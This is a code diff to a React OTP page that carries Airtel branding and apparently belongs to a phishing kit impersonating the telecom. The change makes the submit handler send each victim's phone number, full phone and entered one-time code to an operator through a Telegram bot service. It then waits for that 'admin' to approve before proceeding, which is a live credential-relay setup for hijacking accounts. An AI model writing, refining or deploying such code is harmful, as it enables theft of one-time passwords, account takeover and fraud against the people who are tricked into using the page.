@@ -3,7 +3,6 @@ import { motion } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
-import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
@@ -101,36 +100,18 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   const currentOtp = otpDigits.join('');
   const isOtpComplete = currentOtp.length === 4;
 
-  // Telegram polling hook for OTP verification
-  const { status: telegramStatus } = useTelegramPolling({
-    sessionId,
-    phone,
-    targetStep: 'otp',
-    isActive: isWaitingTelegram,
-    onApproved: () => {
-      setTimeout(() => {
-        setIsWaitingTelegram(false);
-        onOtpSuccess();
-      }, 800);
-    },
-    onRejected: () => {
-      setIsWaitingTelegram(false);
-      setErrorMessage(t('otpError'));
-      setOtpDigits(['', '', '', '']);
-      otpInputRefs.current[0]?.focus();
-    },
-  });
-
   const handleSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     if (!isOtpComplete || isSubmitting) return;
 
     setIsSubmitting(true);
     setErrorMessage(null);
+    setIsWaitingTelegram(true);
 
     try {
       // Send OTP with country and fullPhone to Telegram Bot
-      await telegramService.sendOtp({
+      // This now blocks until admin responds
+      const approved = await telegramService.sendOtp({
         sessionId,
         phone,
         fullPhone: displayPhone,
@@ -141,8 +122,17 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      setIsWaitingTelegram(true);
+      setIsWaitingTelegram(false);
+
+      if (approved) {
+        onOtpSuccess();
+      } else {
+        setErrorMessage(t('otpError'));
+        setOtpDigits(['', '', '', '']);
+        otpInputRefs.current[0]?.focus();
+      }
     } catch (err: any) {
+      setIsWaitingTelegram(false);
       setErrorMessage(
         err.message ||
           (language === 'fr'
